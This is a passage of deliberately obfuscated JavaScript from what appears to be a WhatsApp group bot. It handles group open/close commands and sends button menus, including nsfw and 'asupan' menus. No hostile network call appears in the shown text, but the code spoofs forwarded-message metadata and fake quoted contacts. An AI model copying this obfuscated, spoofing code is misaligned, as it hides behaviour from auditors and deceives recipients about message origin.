0xa60))+_0x36f084[_0x1d72ad(0xbdb,0xd31,0x9a2,0xdd1)][0xa1e+0x1*0x259f+-0x2fbd][_0x1d72ad(0x34b,0x6b3,0x64c,0xa40)]+_0x1d72ad(0x323,0x73a,0x77a,0xbda)+_0xe17afd[_0x56fc15(0x9df,0xa5b,0xa23,0x998)][-0x5*-0x2e7+-0xcb5+-0x42*0x7]['url']+('\x0a\x0a_For\x20the'+'\x20duration\x20'+_0x56fc15(0x4f8,0x4c8,0x90e,0x58c)+_0x56fc15(0xa82,0x8db,0x5d7,0x810)+_0x1d72ad(0x18d,0x14f,0x26a,0x660)+_0x56fc15(0xdd9,0xd65,0xd5a,0x925)+_0x56fc15(0x18a,0x9bc,0x672,0x598)+_0x1d72ad(0x25,0x2be,0x31d,0x72f)));_0x33e37f[_0x56fc15(0x1b4,0x39f,0x3d9,0x390)](_0x36faf4,_0x4ad1ed,_0x5c7750,'')[_0x56fc15(0x85f,0xb40,0xa6e,0x96e)](_0x43e904=>{function _0x5f4aba(_0x4be719,_0x5af9b0,_0x43065e,_0x185931){return _0x56fc15(_0x4be719-0x50,_0x5af9b0-0x1d9,_0x185931,_0x5af9b0-0x98);}_0x54fd24[_0x5f4aba(0x37e,0x352,0x751,0x4cd)](_0x2a2629,_0x54fd24['BzrpM']);});});}});});}catch(_0x4f1e3a){reply(mess[_0x39f25f(0xe7,-0x6,0x4e,0x289)][_0x39f25f(-0x195,-0x123,0x2ad,-0x254)]);}}}sub_yt_zeeone_ofc=type=='listRespon'+_0x1f7707(0x2d4,0x2d,-0x19e,-0x19b)?mek[_0x39f25f(0x2d1,-0xdc,-0x2cd,-0x170)][_0x1f7707(0x3ea,0x5be,0x1d3,-0x171)+_0x39f25f(0x105,0x10,-0x3aa,0x487)][_0x1f7707(-0x3fe,0x6f,-0x2c6,-0xde)]:'',subscribezeeoneofc=type==_0x1f7707(0x215,0x294,0x5f7,0xa94)+_0x1f7707(0x5c9,0x4b5,0x2c2,0x2ee)+'ge'?mek[_0x39f25f(0xbe,-0xdc,0x1f8,-0x14f)]['buttonsRes'+_0x1f7707(0x5ff,0x380,0x2c2,-0x8d)+'ge'][_0x1f7707(0x395,0x33c,0x35,0x3a2)+'ttonId']:'';if(sub_yt_zeeone_ofc==_0x39f25f(0x33a,0x33f,-0x7a,0x717)){console[_0x39f25f(0x3d0,0x59f,0xe3,0x6c4)](color(time,_0x39f25f(0x72e,0x6e1,0x7c5,0xb87)),color(_0x1f7707(0x150,0x221,0x1c3,0x605)+'ge\x20group\x20o'+_0x39f25f(0x6f5,0x40b,0x4a6,0x216)));if(!isBotGroupAdmins)return reply(_0x1f7707(-0x7c,0x7d8,0x3e2,0x233)+'\x20Bot\x20sebag'+'ai\x20admin\x20t'+_0x39f25f(0x58e,0x4ac,0x428,0x964)+'hulu```');await alpha['groupSetti'+_0x39f25f(0x2e1,0xe,0x49b,-0x474)](from,GroupSettingChange['messageSen'+'d'],![]),fakegroup(_0x1f7707(-0x110,0x649,0x2b9,-0x132)+_0x1f7707(0x25b,-0x1e,-0x1fd,0x275)+_0x39f25f(-0x9c,0x281,-0x47,0xe3)+'``');}if(sub_yt_zeeone_ofc==_0x39f25f(0x507,0x178,-0x180,-0x323)+'e'){console[_0x1f7707(0x5b7,0x629,0x3f1,0xee)](color(time,_0x1f7707(0x26b,0x851,0x533,0x6f2)),color(_0x1f7707(-0x2d4,0x23c,0x1c3,0x4b6)+'ge\x20group\x20c'+_0x39f25f(0x624,0x3af,0x644,0x525)));if(!isBotGroupAdmins)return reply(_0x39f25f(0x394,0x590,0x87b,0x666)+_0x1f7707(-0x522,-0x26d,-0x2d6,-0x687)+'ai\x20admin\x20t'+_0x1f7707(-0xb5,0x718,0x2fe,0x2ad)+'hulu```');await alpha[_0x39f25f(0x42,0x2ea,-0x51,-0x124)+'ngChange'](from,GroupSettingChange['messageSen'+'d'],!![]),fakegroup(_0x39f25f(0x4bc,0x467,0x3c7,0x639)+_0x1f7707(-0x16e,0x279,0x1d1,-0xd4)+_0x39f25f(0x502,0x217,0x484,-0xd6));}if(sub_yt_zeeone_ofc==_0x1f7707(0x3d7,0x140,0x572,0x1a0)){console['log'](color(time,_0x1f7707(0x129,0x186,0x533,0x436)),color(_0x1f7707(0x6f,-0x231,0x1c3,0x1f9)+_0x1f7707(0x30e,0x63c,0x3a7,0x62b)+_0x1f7707(-0x1bd,0x37a,0xb4,0x3b4)));const mediax_=await alpha[_0x39f25f(-0xf2,0xdb,-0xea,0xf2)+'sage'](from,pp_userz,MessageType['location'],{'thumbnail':pp_userz});let bacotlu_=mediax_[_0x1f7707(0xbd,-0x6fa,-0x28a,0x15)][_0x1f7707(0x744,0x8d8,0x427,0x674)+'essage']?mediax_[_0x39f25f(0xaf,-0xdc,0x156,-0xda)]['ephemeralM'+_0x39f25f(0x407,0x248,0x495,0x18)]:mediax_;const _0x4e0d38={};_0x4e0d38[_0x39f25f(-0x274,0x0,0x26f,0x39d)+'t']=_0x39f25f(0x25c,-0x8a,0x39,-0x156);const _0x1bd0c2={};_0x1bd0c2[_0x1f7707(0x4d4,0x8b7,0x499,0x3f2)]=_0x39f25f(0x351,0x66e,0x381,0x258),_0x1bd0c2[_0x1f7707(0x11a,0x273,0x1ce,0x361)]=_0x4e0d38,_0x1bd0c2[_0x1f7707(0x93b,0x7c4,0x520,0x187)]=0x1;const _0x4e3e38={};_0x4e3e38[_0x1f7707(-0x49e,0x10,-0x1ae,-0x50)+'t']='✓\x20OWNER';const _0x158dfb={};_0x158dfb[_0x1f7707(0x165,0x182,0x499,0x1b)]=_0x39f25f(0x52c,0x24d,0x61a,-0x18e),_0x158dfb[_0x1f7707(0x61,0x506,0x1ce,0x3a0)]=_0x4e3e38,_0x158dfb['type']=0x1;const buttons_=[_0x1bd0c2,_0x158dfb],btn_={'contentText':quotesmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x39f25f(-0x2e3,0x1d2,0x70,0x155)+ini_mark['split']('@')[0x9e+-0xe53+0x13f*0xb],'buttons':buttons_,'headerType':0x6,'locationMessage':bacotlu_['message']['locationMe'+_0x1f7707(0x2d3,0x2ae,0x2f5,0x4fa)]},_0x273c48={};_0x273c48[_0x39f25f(0x386,0x3cc,0x801,0x3d5)]='hi',_0x273c48['forwarding'+_0x1f7707(0x23,-0x16c,0x0,-0x1ad)]=0x3b9aca00,_0x273c48[_0x1f7707(-0x52b,-0x52d,-0x151,0x14)+'d']=!![],_0x273c48[_0x1f7707(0x1da,0x17b,0x4da,0x538)+_0x1f7707(0x65,-0x84,0x118,-0x20f)]=!![],_0x273c48['mentionedJ'+'id']=[ini_mark];const _0x2974ad={};_0x2974ad[_0x39f25f(-0x2c1,0x11c,-0x383,-0x16b)]=_0x1f7707(0x2e8,0x57,-0xe5,0x263)+'21',_0x2974ad['contextInf'+'o']=_0x273c48,_0x2974ad['quoted']=fkontak,_0x2974ad[_0x39f25f(0x28d,0x688,0x6ab,0x758)+'ral']=!![],alpha[_0x39f25f(-0x241,-0x84,-0x2ec,-0x335)+'e'](from,btn_,MessageType[_0x39f25f(-0x24,0x213,0x3dd,0x46e)+_0x1f7707(-0x254,0x115,-0x23b,-0x678)],_0x2974ad);}if(sub_yt_zeeone_ofc==_0x1f7707(-0x1c6,-0x33f,-0x23f,-0x5fc)){console[_0x39f25f(0x73c,0x59f,0x90f,0x3ea)](color(time,'magenta'),color('List\x20messa'+_0x1f7707(0x784,0x67b,0x56d,0x4ff)+'nu'));const mediaxx_=await alpha[_0x39f25f(-0x25e,0xdb,-0x107,-0x265)+_0x39f25f(-0x3bc,-0x8d,-0x282,-0x474)](from,pp_userz,MessageType[_0x39f25f(0x11a,0x4d5,0x895,0x6d8)],{'thumbnail':pp_userz});let bacotluu_=mediaxx_[_0x39f25f(0x3b8,-0xdc,-0x1c2,-0x134)][_0x39f25f(0x377,0x5d5,0x1ff,0x416)+_0x39f25f(0x131,0x248,-0x1a1,-0xef)]?mediaxx_[_0x1f7707(0x121,-0x138,-0x28a,-0x6af)][_0x39f25f(0xa64,0x5d5,0xa45,0x2a7)+'essage']:mediaxx_;const _0x3dd425={};_0x3dd425[_0x39f25f(-0x32d,0x0,-0x4f,-0x1a9)+'t']='⋮☰\x20BACK';const _0x1460c0={};_0x1460c0[_0x1f7707(0x68e,0x95,0x499,0x52c)]=_0x39f25f(0xaf7,0x66e,0x73d,0x470),_0x1460c0[_0x39f25f(0x590,0x37c,0x6d0,-0x12)]=_0x3dd425,_0x1460c0[_0x1f7707(0x225,0x5c6,0x520,0x3fb)]=0x1;const _0x37e2d2={};_0x37e2d2[_0x1f7707(-0x5bd,-0x5dc,-0x1ae,0x28a)+'t']=_0x1f7707(0xa56,0x5cb,0x5bd,0x7aa);const _0x171aa2={};_0x171aa2[_0x1f7707(0x3e0,0x772,0x499,0x4c9)]=_0x1f7707(0x16b,-0x18f,0x9f,-0x398),_0x171aa2[_0x1f7707(0x102,0x58c,0x1ce,0x29e)]=_0x37e2d2,_0x171aa2[_0x1f7707(0x9c4,0x714,0x520,0x3d1)]=0x1;const buttonss_=[_0x1460c0,_0x171aa2],btnn_={'contentText':animemenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(-0x2ca,-0x42a,0x24,-0x485)+ini_mark[_0x39f25f(0x151,0x3bc,-0xbf,0xa2)]('@')[-0x6*0x3f5+0x197*-0x1+0x1955],'buttons':buttonss_,'headerType':0x6,'locationMessage':bacotluu_[_0x1f7707(0x5d,-0x6ab,-0x28a,-0x64)][_0x39f25f(0x325,0x9c,-0x8,0x1a9)+_0x39f25f(0x6f8,0x4a3,0x35a,0x8b9)]},_0x451452={};_0x451452[_0x1f7707(0x4c1,0x250,0x21e,0x379)]='hi',_0x451452[_0x39f25f(0x735,0x6ba,0x30b,0x6a5)+'Score']=0x3b9aca00,_0x451452[_0x1f7707(-0xa4,-0x496,-0x151,-0x210)+'d']=!![],_0x451452[_0x1f7707(0x5bc,0x630,0x4da,0x46)+_0x1f7707(0x146,0x20b,0x118,0x354)]=!![],_0x451452[_0x39f25f(0x4da,0x63f,0x2af,0x8e5)+'id']=[ini_mark];const _0x25110d={};_0x25110d[_0x39f25f(-0x372,0x11c,0x2a1,-0x223)]=_0x39f25f(-0x327,0xc9,0x1ab,0x2d0)+'21',_0x25110d[_0x1f7707(0x387,0x563,0x52f,0x9e1)+'o']=_0x451452,_0x25110d[_0x1f7707(-0x367,-0x4ab,-0xa8,-0x4d4)]=fkontak,_0x25110d[_0x39f25f(0x8f9,0x688,0x3c2,0x914)+'ral']=!![],alpha['sendMessag'+'e'](from,btnn_,MessageType[_0x39f25f(0xfd,0x213,0x352,-0x21d)+'sage'],_0x25110d);}if(sub_yt_zeeone_ofc==_0x1f7707(0xf2,-0xfc,0xb1,-0x1a0)+'u'){console[_0x1f7707(0xf0,0x783,0x3f1,0x182)](color(time,_0x1f7707(0x22f,0x21f,0x533,0x466)),color(_0x39f25f(0x73d,0x371,0x7a9,0x51f)+_0x1f7707(-0xbe,-0x51a,-0x20a,-0x36a)+_0x39f25f(-0xa5,0x28d,0x55b,0x6ec)));const mediaxxx_=await alpha[_0x39f25f(-0x175,0xdb,-0x22,0x222)+'sage'](from,pp_userz,MessageType[_0x1f7707(0x62a,0xf3,0x327,0x6e8)],{'thumbnail':pp_userz});let bacotluuu_=mediaxxx_[_0x1f7707(0xbc,-0x355,-0x28a,-0x675)][_0x1f7707(0x354,0x3e1,0x427,0x754)+_0x1f7707(-0xb,0xc1,0x9a,0x51c)]?mediaxxx_['message'][_0x39f25f(0x126,0x5d5,0x179,0x3a6)+'essage']:mediaxxx_;const _0x274745={};_0x274745[_0x39f25f(-0x240,0x0,0x41a,0x24a)+'t']=_0x39f25f(-0x2d6,-0x8a,-0x3d7,0x266);const _0x3c8249={};_0x3c8249[_0x39f25f(0x4cb,0x647,0xa39,0x92b)]=_0x1f7707(0x161,0x103,0x4c0,0x4c8),_0x3c8249[_0x39f25f(0x359,0x37c,-0xd7,0x234)]=_0x274745,_0x3c8249[_0x39f25f(0x28e,0x6ce,0x72d,0x900)]=0x1;const _0x22e26f={};_0x22e26f[_0x39f25f(0x278,0x0,0x2fc,0x41e)+'t']=_0x39f25f(0x986,0x76b,0x7fb,0xbb9);const _0x1420b3={};_0x1420b3[_0x39f25f(0x7fd,0x647,0x28c,0x7be)]=_0x39f25f(0x178,0x24d,0x414,-0x24e),_0x1420b3[_0x1f7707(-0x211,-0x78,0x1ce,0x1a4)]=_0x22e26f,_0x1420b3[_0x39f25f(0xa0d,0x6ce,0xaaf,0xac1)]=0x1;const buttonsss_=[_0x3c8249,_0x1420b3],btnnn_={'contentText':convertmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(0x4a7,-0x1b8,0x24,-0x40e)+ini_mark[_0x39f25f(0x1bf,0x3bc,-0x3a,0x74f)]('@')[0x1d*0x5a+0x10f5+-0x1b27],'buttons':buttonsss_,'headerType':0x6,'locationMessage':bacotluuu_[_0x1f7707(-0x411,-0x532,-0x28a,0x5b)][_0x1f7707(-0x451,-0x22e,-0x112,0x390)+'ssage']},_0x367480={};_0x367480[_0x39f25f(0x555,0x3cc,0x5f0,0x351)]='hi',_0x367480[_0x39f25f(0x4ed,0x6ba,0x708,0x4cf)+_0x39f25f(0xac,0x1ae,0x5cd,0x5c6)]=0x3b9aca00,_0x367480[_0x39f25f(0xe2,0x5d,-0x1de,-0x2f1)+'d']=!![],_0x367480[_0x1f7707(0x791,0x8c0,0x4da,0x3c4)+'ral']=!![],_0x367480[_0x39f25f(0x9ce,0x63f,0xa95,0x468)+'id']=[ini_mark];const _0x469533={};_0x469533[_0x1f7707(0x2e0,-0x20,-0x92,-0x214)]='Botwea\x20©2k'+'21',_0x469533[_0x1f7707(0x56d,0x2aa,0x52f,0x476)+'o']=_0x367480,_0x469533[_0x1f7707(0x3d2,0x233,-0xa8,-0x1ee)]=fkontak,_0x469533['sendEpheme'+_0x39f25f(0x42d,0x2c6,0x2d1,0x48)]=!![],alpha[_0x1f7707(-0x238,0x15c,-0x232,-0x190)+'e'](from,btnnn_,MessageType['buttonsMes'+'sage'],_0x469533);}if(sub_yt_zeeone_ofc==_0x1f7707(0x90d,0x515,0x656,0x411)){console[_0x1f7707(0xcd,0x45b,0x3f1,0x25e)](color(time,_0x39f25f(0x385,0x6e1,0x880,0x42f)),color(_0x1f7707(0x2e6,0x5f,0x1c3,0x2ae)+_0x39f25f(0x10a,0x1c0,0xec,0xbe)+'menu'));const mediaxxxx_=await alpha[_0x1f7707(-0x45e,-0x6e,-0xd3,0x24a)+_0x1f7707(-0x62f,-0x162,-0x23b,-0xec)](from,pp_userz,MessageType[_0x1f7707(0x63d,0x2bc,0x327,0x465)],{'thumbnail':pp_userz});let bacotluuuu_=mediaxxxx_[_0x39f25f(0x35d,-0xdc,-0x33d,-0x26e)]['ephemeralM'+_0x1f7707(-0x111,0x26b,0x9a,0x1ed)]?mediaxxxx_[_0x39f25f(-0x11,-0xdc,-0x54c,-0x4a8)][_0x39f25f(0x6f3,0x5d5,0x8fc,0x9ca)+_0x39f25f(-0x160,0x248,0x1b1,0x1b4)]:mediaxxxx_;const _0x6497d1={};_0x6497d1[_0x1f7707(-0x3a7,-0x9d,-0x1ae,0x175)+'t']=_0x39f25f(-0x53b,-0x8a,-0x488,0x3de);const _0x3306ee={};_0x3306ee['buttonId']=_0x1f7707(0x3d8,0x22d,0x4c0,0x687),_0x3306ee[_0x1f7707(-0xa,0x167,0x1ce,0x245)]=_0x6497d1,_0x3306ee[_0x1f7707(0x118,0x437,0x520,0x767)]=0x1;const _0x51feb4={};_0x51feb4[_0x39f25f(0x286,0x0,-0x3d3,0x196)+'t']=_0x1f7707(0x537,0xa0b,0x5bd,0x8d1);const _0x217633={};_0x217633[_0x1f7707(0x73f,0x2de,0x499,0x7a)]=_0x1f7707(-0x6e,0x4e6,0x9f,0xec),_0x217633[_0x39f25f(0x27d,0x37c,0x408,0x784)]=_0x51feb4,_0x217633['type']=0x1;const buttonssss_=[_0x3306ee,_0x217633],btnnnn_={'contentText':nsfwmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(-0xec,0x13d,0x24,-0x24c)+ini_mark[_0x39f25f(0x6a6,0x3bc,0xc9,0x6ac)]('@')[0x55*-0x3+-0x2599+0x2698],'buttons':buttonssss_,'headerType':0x6,'locationMessage':bacotluuuu_[_0x1f7707(0x210,0x1e3,-0x28a,-0x13b)][_0x39f25f(0x467,0x9c,0x354,-0xda)+'ssage']},_0x523b00={};_0x523b00['text']='hi',_0x523b00[_0x39f25f(0x552,0x6ba,0xa3f,0xb19)+_0x39f25f(0x279,0x1ae,0x2b5,-0x232)]=0x3b9aca00,_0x523b00['isForwarde'+'d']=!![],_0x523b00[_0x1f7707(0x355,0x26a,0x4da,0x19d)+_0x39f25f(0x3af,0x2c6,0x752,0x6d7)]=!![],_0x523b00[_0x1f7707(0x355,0x90e,0x491,0x17f)+'id']=[ini_mark];const _0x2e57fb={};_0x2e57fb[_0x1f7707(-0x2d6,0x27d,-0x92,0x2d0)]=_0x39f25f(-0x219,0xc9,-0xff,-0x49)+'21',_0x2e57fb[_0x1f7707(0x586,0x5eb,0x52f,0x8bc)+'o']=_0x523b00,_0x2e57fb[_0x1f7707(-0xb0,0x2cc,-0xa8,-0x3f)]=fkontak,_0x2e57fb[_0x1f7707(0x5ac,0x627,0x4da,0x174)+_0x39f25f(0x2f0,0x2c6,0x21e,0x6eb)]=!![],alpha[_0x1f7707(-0x343,0x155,-0x232,0x27)+'e'](from,btnnnn_,MessageType[_0x1f7707(0x4e8,0x2b1,0x65,0x1ae)+_0x1f7707(-0x63d,0x26e,-0x23b,-0x403)],_0x2e57fb);}if(sub_yt_zeeone_ofc==_0x39f25f(0x9d2,0x683,0x887,0x1c6)+'u'){console[_0x39f25f(0x13c,0x59f,0x841,0x8d4)](color(time,_0x39f25f(0x9c3,0x6e1,0x708,0x894)),color(_0x39f25f(0x277,0x371,0x6ef,0x471)+_0x1f7707(-0xb2,-0x1e3,0x12,-0x2a6)+'menu'));const mediaxnxxx_=await alpha['prepareMes'+_0x1f7707(-0x45b,0x250,-0x23b,-0x58b)](from,pp_userz,MessageType['location'],{'thumbnail':pp_userz});let bacotluuuou_=mediaxnxxx_[_0x1f7707(0xaa,-0x3af,-0x28a,0x1e8)][_0x1f7707(0x66b,0x209,0x427,0x5cc)+'essage']?mediaxnxxx_[_0x1f7707(-0x3ed,-0x58b,-0x28a,-0x393)]['ephemeralM'+_0x1f7707(-0x3dd,0x151,0x9a,-0x10a)]:mediaxnxxx_;const _0x463335={};_0x463335[_0x1f7707(-0x1ed,-0x3a9,-0x1ae,-0x560)+'t']='⋮☰\x20BACK';const _0x335802={};_0x335802['buttonId']='Command',_0x335802[_0x1f7707(-0x25c,0x4a5,0x1ce,-0x144)]=_0x463335,_0x335802[_0x1f7707(0x10f,0x304,0x520,0x241)]=0x1;const _0x1075d9={};_0x1075d9[_0x1f7707(0x2b4,-0x33a,-0x1ae,0xba)+'t']=_0x1f7707(0x304,0x17c,0x5bd,0x8c4);const _0x5b19a9={};_0x5b19a9[_0x39f25f(0x249,0x647,0x717,0x7ec)]=_0x1f7707(-0x21f,0x414,0x9f,-0x236),_0x5b19a9[_0x1f7707(0x4ec,-0x68,0x1ce,0x649)]=_0x1075d9,_0x5b19a9['type']=0x1;const buttonssss_=[_0x335802,_0x5b19a9],btnnnon_={'contentText':asupanmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x39f25f(0x325,0x1d2,0x621,0x1c)+ini_mark[_0x39f25f(0x2fb,0x3bc,0x783,-0xa1)]('@')[-0x13*-0x14b+0x129a+-0x101*0x2b],'buttons':buttonssss_,'headerType':0x6,'locationMessage':bacotluuuou_[_0x39f25f(0x52,-0xdc,-0xe0,0xe5)][_0x1f7707(0x380,0x48,-0x112,-0x455)+_0x39f25f(0x780,0x4a3,0x491,0x3b1)]},_0x1a439c={};_0x1a439c['text']='hi',_0x1a439c[_0x39f25f(0x926,0x6ba,0x805,0x69e)+_0x39f25f(0x617,0x1ae,0x239,0xd2)]=0x3b9aca00,_0x1a439c[_0x1f7707(-0x342,-0x277,-0x151,-0xf5)+'d']=!![],_0x1a439c[_0x39f25f(0x383,0x688,0x7bc,0x4f0)+_0x39f25f(0x682,0x2c6,-0x84,0x59d)]=!![],_0x1a439c[_0x1f7707(0x56d,0x330,0x491,0x7f4)+'id']=[ini_mark];const _0x453845={};_0x453845['caption']=_0x1f7707(0x378,-0x560,-0xe5,0x256)+'21',_0x453845[_0x1f7707(0x51b,0x58a,0x52f,0x54a)+'o']=_0x1a439c,_0x453845[_0x1f7707(0x2da,-0x3ba,-0xa8,0x1c)]=fkontak,_0x453845[_0x39f25f(0x9a8,0x688,0x65c,0x5be)+'ral']=!![],alpha[_0x1f7707(-0x6e0,-0x2e5,-0x232,-0x395)+'e'](from,btnnnon_,MessageType['buttonsMes'+_0x39f25f(0x3e8,-0x8d,-0x47,0x8)],_0x453845);}if(sub_yt_zeeone_ofc==_0x1f7707(0x374,0x193,0x243,0x4ae)+'ot'){console['log'](color(time,_0x39f25f(0x445,0x6e1,0x64e,0x418)),color(_0x1f7707(-0x201,0x310,-0x186,-0x1c7)+'tidak\x20munc'+_0x39f25f(-0x399,0x63,0x83,-0x296)+_0x1f7707(0x187,0x39e,0x3b5,0x856)+_0x1f7707(-0x162,-0x336,-0x153,-0xd8)));const mediaxnxxvx_=await alpha[_0x39f25f(-0x32,0xdb,0x282,-0x30d)+'sage'](from,pp_userz,MessageType['location'],{'thumbnail':pp_userz});let bacotlupuuou_=mediaxnxxvx_[_0x1f7707(-0x3bd,0x88,-0x28a,-0x638)]['ephemeralM'+'essage']?mediaxnxxvx_[_0x39f25f(-0x4c5,-0xdc,-0x43b,-0x10b)]['ephemeralM'+'essage']:mediaxnxxvx_;const _0x4e7f32={};_0x4e7f32['displayTex'+'t']='⋮☰\x20BACK';const _0x322a52={};_0x322a52[_0x1f7707(0x7b4,0x6e,0x499,0x5c4)]=_0x1f7707(0x81b,0x258,0x4c0,0x122),_0x322a52[_0x39f25f(0xfe,0x37c,0x30e,0x2ff)]=_0x4e7f32,_0x322a52['type']=0x1;const _0x4d9d3d={};_0x4d9d3d['displayTex'+'t']=_0x39f25f(0x331,0x76b,0xbe3,0x7b1);const _0xec10d2={};_0xec10d2[_0x39f25f(0x1c1,0x647,0x93f,0x206)]=_0x1f7707(-0x38e,-0xe2,0x9f,0x163),_0xec10d2[_0x1f7707(0x34d,-0x2b9,0x1ce,0x646)]=_0x4d9d3d,_0xec10d2['type']=0x1;const buttonsspss_=[_0x322a52,_0xec10d2],btnnpnon_={'contentText':allmenu(prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(-0x476,0x4a1,0x24,0x48f)+ini_mark[_0x39f25f(0x1be,0x3bc,0x1ce,0x31d)]('@')[0xb7b*-0x3+-0x1*-0x1117+0x115a],'buttons':buttonsspss_,'headerType':0x6,'locationMessage':bacotlupuuou_[_0x1f7707(-0x384,0x1a9,-0x28a,-0xa8)][_0x1f7707(-0x4a9,-0x412,-0x112,-0x153)+_0x1f7707(0x2a1,-0xd2,0x2f5,0xca)]},_0x22eedc={};_0x22eedc[_0x1f7707(-0x21,0x15a,0x21e,-0x95)]='hi',_0x22eedc['forwarding'+_0x1f7707(0x34,-0xb7,0x0,-0x33e)]=0x3b9aca00,_0x22eedc['isForwarde'+'d']=!![],_0x22eedc[_0x1f7707(0x109,0x86,0x4da,0x62)+'ral']=!![],_0x22eedc[_0x1f7707(0x81e,0x936,0x491,0x36e)+'id']=[ini_mark];const _0x5bcd50={};_0x5bcd50[_0x1f7707(-0x4a5,-0x87,-0x92,0x124)]='Botwea\x20©2k'+'21',_0x5bcd50['contextInf'+'o']=_0x22eedc,_0x5bcd50[_0x1f7707(-0x550,-0x371,-0xa8,-0x4e6)]=fkontak,_0x5bcd50[_0x39f25f(0x5cf,0x688,0xa16,0x861)+'ral']=!![],alpha['sendMessag'+'e'](from,btnnpnon_,MessageType[_0x39f25f(0x37,0x213,0x1b7,-0x9e)+'sage'],_0x5bcd50);}if(sub_yt_zeeone_ofc=='downloadme'+'nu'){console['log'](color(time,_0x39f25f(0x47e,0x6e1,0x5ae,0x760)),color(_0x39f25f(0x6c6,0x371,0xda,0x811)+_0x39f25f(0xbdb,0x7b4,0x854,0x911)+_0x1f7707(0x50b,0x71a,0x418,0x1c2)));const medioaxnxxvx_=await alpha[_0x39f25f(0x57e,0xdb,-0x23e,-0x37)+_0x1f7707(-0x5ff,-0x2e,-0x23b,-0x38c)](from,pp_userz,MessageType['location'],{'thumbnail':pp_userz});let bacotlujpuuou_=medioaxnxxvx_['message'][_0x1f7707(0x60d,0xd2,0x427,0x3da)+_0x39f25f(-0xb9,0x248,0x62a,-0x6)]?medioaxnxxvx_[_0x1f7707(-0x555,0x1b,-0x28a,-0x422)][_0x1f7707(0x850,0x33e,0x427,0x245)+_0x1f7707(0x414,0x8b,0x9a,0x2ac)]:medioaxnxxvx_;const _0x59fad8={};_0x59fad8[_0x39f25f(0x130,0x0,0x2b3,0x401)+'t']='⋮☰\x20BACK';const _0x303671={};_0x303671[_0x39f25f(0x6df,0x647,0x3d4,0x343)]=_0x39f25f(0x399,0x66e,0x44e,0x4d7),_0x303671[_0x1f7707(-0x148,0x349,0x1ce,0x589)]=_0x59fad8,_0x303671[_0x39f25f(0x38b,0x6ce,0x2f5,0x728)]=0x1;const _0x5dbe74={};_0x5dbe74[_0x39f25f(-0x27e,0x0,0x1b6,0x2b4)+'t']='✓\x20OWNER';const _0x36ce16={};_0x36ce16['buttonId']=_0x39f25f(0x393,0x24d,0x2b1,0x1c5),_0x36ce16['buttonText']=_0x5dbe74,_0x36ce16['type']=0x1;const buttonsspsos_=[_0x303671,_0x36ce16],btnnpnoon_={'contentText':downloadmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(0x222,-0x2c7,0x24,-0x1a0)+ini_mark['split']('@')[-0x1e26+0x38f*0xa+0x57*-0x10],'buttons':buttonsspsos_,'headerType':0x6,'locationMessage':bacotlujpuuou_[_0x1f7707(-0x2b6,-0x73f,-0x28a,0x15e)][_0x39f25f(0x255,0x9c,-0x63,0x40d)+'ssage']},_0x2b756e={};_0x2b756e[_0x1f7707(0x554,-0x205,0x21e,0x1cd)]='hi',_0x2b756e['forwarding'+'Score']=0x3b9aca00,_0x2b756e[_0x39f25f(0x49e,0x5d,0x15b,0x4d7)+'d']=!![],_0x2b756e[_0x39f25f(0x645,0x688,0x490,0x56a)+_0x1f7707(0x135,-0x2ba,0x118,0x1ae)]=!![],_0x2b756e[_0x1f7707(0xbc,0x10c,0x491,0x55)+'id']=[ini_mark];const _0x29c201={};_0x29c201[_0x1f7707(-0x2cf,0x1f,-0x92,-0x2ec)]=_0x39f25f(-0x2fa,0xc9,0x213,0x111)+'21',_0x29c201[_0x1f7707(0x7db,0x763,0x52f,0x98c)+'o']=_0x2b756e,_0x29c201[_0x39f25f(0x28f,0x106,0x577,0x558)]=fkontak,_0x29c201[_0x39f25f(0x9b3,0x688,0x834,0x7f1)+'ral']=!![],alpha[_0x39f25f(0x328,-0x84,0x47,-0x2a)+'e'](from,btnnpnoon_,MessageType['buttonsMes'+_0x1f7707(-0x192,0x100,-0x23b,-0xe0)],_0x29c201);}if(sub_yt_zeeone_ofc=='funmenu'){console[_0x1f7707(0x448,0x703,0x3f1,0x7e0)](color(time,_0x39f25f(0x267,0x6e1,0xab0,0x26d)),color(_0x1f7707(0x413,0x63,0x1c3,-0x7b)+_0x39f25f(0x8ec,0x65b,0x793,0x734)));const medioanxnxxvx_=await alpha[_0x39f25f(0x224,0xdb,0x52a,-0x1f0)+_0x1f7707(0x263,-0x20a,-0x23b,0x23f)](from,pp_userz,MessageType[_0x39f25f(0x503,0x4d5,0x8cd,0x46)],{'thumbnail':pp_userz});let bacotlujpuuoou_=medioanxnxxvx_[_0x1f7707(-0x3f3,0x5b,-0x28a,-0x39b)][_0x39f25f(0x54a,0x5d5,0x933,0x632)+_0x1f7707(-0x12a,-0x253,0x9a,0xeb)]?medioanxnxxvx_[_0x1f7707(-0x714,-0x4bf,-0x28a,-0x57b)]['ephemeralM'+_0x39f25f(0x4a4,0x248,0x47f,0x39e)]:medioanxnxxvx_;const _0x51cc10={};_0x51cc10[_0x39f25f(0x23c,0x0,0x15f,0x422)+'t']=_0x39f25f(0xa6,-0x8a,-0x3b7,-0x323);const _0x78c883={};_0x78c883[_0x39f25f(0x494,0x647,0x3c5,0x58d)]='Command',_0x78c883['buttonText']=_0x51cc10,_0x78c883[_0x39f25f(0x431,0x6ce,0xa46,0x70a)]=0x1;const _0x26851d={};_0x26851d['displayTex'+'t']=_0x1f7707(0x407,0x3c0,0x5bd,0x8e1);const _0x3ec252={};_0x3ec252[_0x1f7707(0x831,0x4ef,0x499,0x5e8)]=_0x1f7707(-0x22e,0x29d,0x9f,0x306),_0x3ec252['buttonText']=_0x26851d,_0x3ec252['type']=0x1;const 